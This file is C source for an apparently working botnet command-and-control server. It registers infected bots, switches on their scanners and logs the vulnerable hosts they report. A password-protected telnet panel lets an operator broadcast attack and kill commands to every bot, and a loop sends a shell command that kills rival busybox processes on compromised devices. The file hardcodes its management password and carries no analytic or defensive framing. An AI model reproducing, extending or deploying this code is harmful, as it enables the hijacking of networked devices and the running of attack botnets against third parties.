#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define MY_MGM_PASS "LulzIsADick" // modified by ShAy, if you have this you shouldn't. Fuck you

#define MAXFDS 1000000

struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
struct args {
        int sock;
        struct sockaddr_in cli_addr;
};
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}

void trim(char *str) // Remove whitespace from a string and properly null-terminate it.
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{ // man fcntl
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        /*
              F_SETFL (int)
              Set  the  file  status  flags  to  the  value specified by arg.  File access mode (O_RDONLY, O_WRONLY, O_RDWR) and file creation flags (i.e., O_CREAT, O_EXCL, O_NOCTTY, O_TRUNC) in arg are
              ignored.  On Linux this command can change only the O_APPEND, O_ASYNC, O_DIRECT, O_NOATIME, and O_NONBLOCK flags.
        */
        s = fcntl (sfd, F_SETFL, flags);
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
        hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
        hints.ai_flags = AI_PASSIVE;     /* All interfaces */
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\n", 0, MSG_NOSIGNAL);
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) {
                    send(i, "\n", 0, MSG_NOSIGNAL);
                } else send(i, "\n", 1, MSG_NOSIGNAL);
        }
}

void *epollEventLoop(void *useless) // the big loop used to control each bot asynchronously. Many threads of this get spawned.
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;

                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len); // accept a connection from a bot.
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }

                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;

                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }

                                        if(dup)
                                        {
                                                if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }

                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }

                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }

					clients[infd].connected = rand() % 70000; //jesus christ change this.
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);

                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                        if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
						if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7;
                                                        fprintf(fileFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(fileFD);
							//TODO: automatically exploit that particular IP after scanning for dir and uploading correct arch stuffs.
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        //should really add some checking or something but meh
                                                        continue;
                                                }

                                                printf("buf: \"%s\"\n", buf);
                                        }

                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }

                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}

unsigned int clientsConnected() // counts the number of bots connected by looping over every possible file descriptor and checking if it's connected or not
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }

        return total;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
	register int iop;
	int pdes[2], fds, pid;

	if (*type != 'r' && *type != 'w' || type[1]) return -1;

	if (pipe(pdes) < 0) return -1;
	if (fdopen_pids == NULL) {
		if ((fds = getdtablesize()) <= 0) return -1;
		if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
		memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
	}

	switch (pid = vfork())
	{
	case -1:
		close(pdes[0]);
		close(pdes[1]);
		return -1;
	case 0:
		if (*type == 'r') {
			if (pdes[1] != 1) {
				dup2(pdes[1], 1);
				close(pdes[1]);
			}
			close(pdes[0]);
		} else {
			if (pdes[0] != 0) {
				(void) dup2(pdes[0], 0);
				(void) close(pdes[0]);
			}
			(void) close(pdes[1]);
		}
		execl("/bin/sh", "sh", "-c", program, NULL);
		_exit(127);
	}
	if (*type == 'r') {
		iop = pdes[0];
		(void) close(pdes[1]);
	} else {
		iop = pdes[1];
		(void) close(pdes[0]);
	}
	fdopen_pids[iop] = pid;
	return (iop);
}

int fdpclose(int iop)
{
	register int fdes;
	sigset_t omask, nmask;
	int pstat;
	register int pid;

	if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
	(void) close(iop);
	sigemptyset(&nmask);
	sigaddset(&nmask, SIGINT);
	sigaddset(&nmask, SIGQUIT);
	sigaddset(&nmask, SIGHUP);
	(void) sigprocmask(SIG_BLOCK, &nmask, &omask);
	do {
		pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
	} while (pid == -1 && errno == EINTR);
	(void) sigprocmask(SIG_SETMASK, &omask, NULL);
	fdopen_pids[fdes] = 0;
	return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

void *telnetWorker(void *arguments)
{
        struct args *argument = arguments;
        int thefd = argument->sock;
        managesConnected++;
        pthread_t title;
        char buf[2048];

        memset(buf, 0, sizeof buf);
        if(send(thefd, "", 0, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, MY_MGM_PASS) != 0) goto end;
        memset(buf, 0, 2048);
	if(send(thefd, "\033[1A", 4, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[1m\x1b[31m*****************************************\r\n", 54, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*         \x1b[31mNULL THE PLANET\x1b[31m              *\r\n", 54, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*****************************************\r\n\r\n\x1b[31m> \x1b[31m", 61, MSG_NOSIGNAL) == -1) goto end;

	while(fdgets(buf, sizeof buf, thefd) > 0)
        {
            trim(buf);
            if(strlen(buf) == 0) continue;
            if(send(thefd, "", 0, MSG_NOSIGNAL) == -1) goto end;
            if(strncmp(buf, "BOTS", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "BOTS ONLINE: %d\r\n", clientsConnected(), managesConnected);
                    send(thefd, buffer, strlen(buffer), MSG_NOSIGNAL);
                    continue;
                }
        if(strncmp(buf, ".KILL", 5) == 0){
                    char buffer[2048];
                    memset(buffer, 0, 2048);
                    sprintf(buffer, "!* KILLATTK");
            broadcast(buffer, thefd);
                    continue;
                }
        //XORA
        FILE *logFile;
                logFile = fopen("/tmp/.log", "a");
                fprintf(logFile, "%s\n", buf);
                fclose(logFile);
                broadcast(buf, thefd);
                memset(buf, 0, 2048);
        }
        end:
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}


void *telnetListener(int port)
{
        int sockfd;
        struct args arguments;
        socklen_t clilen;
        struct sockaddr_in serv_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(arguments.cli_addr);
        while(1)
        {
                arguments.sock = accept(sockfd, (struct sockaddr *)&arguments.cli_addr, &clilen);
                if (arguments.sock < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, telnetWorker, &arguments);
        }
}

int main(int argc, char *argv[])
{
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        port = atoi(argv[3]);
        if (argc != 4)
        {
                fprintf (stderr, "%s <bot-port> <threads> <cnc-port>\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        fileFD = fopen(".output.txt", "a+");
        threads = atoi(argv[2]);

        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();

        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();

        s = listen (listenFD, SOMAXCONN);
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }

        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);

        while(1)
        {
		broadcast("PING", -1);

		broadcast("!* SH kill -9 $(pidof ./busybox) && killall ./busybox", -1); // KILL THE FUCKERS, DIE

                sleep(60);
        }

        close (listenFD);

        return EXIT_SUCCESS;
}
